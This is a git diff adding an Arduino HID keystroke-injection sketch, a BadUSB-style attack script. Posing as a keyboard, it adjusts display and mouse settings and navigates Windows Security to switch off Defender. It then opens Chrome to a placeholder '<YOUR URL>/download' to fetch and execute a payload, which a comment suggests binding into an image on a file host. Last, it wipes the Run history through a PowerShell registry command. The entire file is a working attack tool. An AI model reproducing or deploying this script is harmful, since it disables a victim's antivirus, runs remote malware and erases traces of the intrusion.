@@ -1,0 +1,342 @@
+#include <HID-Project.h>
+#include <HID-Settings.h>
+
+// Utility function
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup()
+{
+  // Start Keyboard and Mouse
+  AbsoluteMouse.begin();
+  Keyboard.begin();
+
+  // Start Payload
+  // For changing screen brightness
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_ESC);
+  Keyboard.releaseAll();
+
+  delay(50);
+
+  Keyboard.print("screen brightness");
+
+  delay(100);
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  // For increasing mouse pointer size
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_ESC);
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("mouse settings");
+
+  delay(100);
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  typeKey(KEY_TAB);
+
+  delay(100);
+
+  typeKey(KEY_TAB);
+
+  delay(100);
+
+  typeKey(KEY_TAB);
+
+  delay(100);
+
+  typeKey(KEY_TAB);
+
+  delay(100);
+
+  typeKey(KEY_TAB);
+
+  delay(100);
+
+  typeKey(KEY_RETURN);
+
+  delay(150);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  typeKey(KEY_RIGHT_ARROW);
+
+  delay(20);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  // Switching off windows defender
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_ESC);
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("windows security");
+
+  delay(100);
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  typeKey(KEY_TAB);
+
+  delay(100);
+
+  typeKey(KEY_TAB);
+
+  delay(100);
+
+  typeKey(KEY_TAB);
+
+  delay(100);
+
+  typeKey(KEY_TAB);
+
+  delay(100);
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  typeKey(' ');
+
+  delay(300);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(121);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  // Downloading and executing payload
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(300);
+
+  Keyboard.print("chrome");
+
+  delay(300);
+
+  typeKey(KEY_RETURN);
+
+  delay(300);
+
+  Keyboard.print("<YOUR URL>/download");
+
+  // Can upload your payload binded in image on nextcloud or any other platform and paste the url in <YOUR URL>
+
+  delay(400);
+
+  typeKey(KEY_RETURN);
+
+  delay(300);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(106);
+  Keyboard.releaseAll();
+
+  delay(300);
+
+  typeKey(KEY_RETURN);
+
+  delay(300);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  // Clearing off RUN history
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(400);
+
+  Keyboard.print("powershell \"rp -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"");
+
+  delay(400);
+
+  typeKey(KEY_RETURN);
+
+  // End Payload
+
+  // Stop Keyboard and Mouse
+  Keyboard.end();
+  AbsoluteMouse.end();
+}
+
+// Unused
+void loop() {}
